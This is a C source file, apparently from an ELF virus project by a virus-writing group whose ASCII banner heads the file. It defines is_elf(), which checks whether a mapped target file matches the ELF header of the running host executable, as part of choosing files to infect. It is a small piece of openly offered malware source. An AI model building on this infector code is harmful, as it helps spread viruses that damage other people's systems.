/*
     .........................................................
     :         ____ ___.__. ____   ____  _______  ___        :
     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
     :       \  \___\___  |   |  \  ___(  <_> >    <         :
     :        \___  > ____|___|  /\___  >____/__/\_ \        :
     :            \/\/         \/     \/           \/        :
     :                   __www.cyneox.tk_                    :
     :                                                       :
     :                                                       :
     :                        member of                      :
     :                                                       :
     :             _______  _________     _____              :
     :            \______ \ \_   ___ \   /  _  \             :
     :             |    |  \/    \  \/  /  /_\  \            :
     :             |    `   \     \____/    |    \           :
     :            /_______  /\______  /\____|__  /           :
     :                    \/        \/         \/            :
     :                ( Dark Coderz Alliance )               :
     :                   __www.dca-vx.tk__                   :
     :.......................................................:

*/

/*
   Description : is_elf checks if our maped file is a ELF file.Remember every ELF file
   contains at the beginning of the file following byte order : ".ELF"
*/


#include "defines.h"

int is_elf(Infect *file)
{
	enum { COMP_SZ = offsetof(Elf32_Ehdr , e_entry) } ;
	Elf32_Ehdr *ehdr=file->mmap.ehdr;

        /* CURRENT = the file that is currently executed.We need that to compare
	   the targets bytes with the bytes of *this* file.This is quite logical
	   since the currently file is an ELF file because we're executing it *right*
	   now ;)
	*/

	fprintf(stdout,"(\033[31mis_elf\033[0m) ---> CURRENT = %p\n",CURRENT);

	/* comparing data of target file with data of actual/current file */
	/* this is usefull coz we dont need to compare the data with any
	 * structure entries (Elf32_Ehdr in <elf-h> ) anymore.
	 * so we compare the target with the host executable currently running
	 * the virus.
	 */
        
	/* see /usr/include/elf.h for more information.Elf32_Ehdr is very important...*/

	if(memcmp(&ehdr->e_ident,CURRENT->e_ident,COMP_SZ)) ERROR(is_elf);
	
	/* comparing targets data with data of CURRENT... */
	
	if(ehdr->e_phoff != CURRENT->e_phoff) ERROR(is_elf);
	if(ehdr->e_ehsize != CURRENT->e_ehsize) ERROR(is_elf);
	if(ehdr->e_phentsize != CURRENT->e_phentsize) ERROR(is_elf);
	if(ehdr->e_shentsize != CURRENT->e_shentsize) ERROR(is_elf);
		
	return true;
}
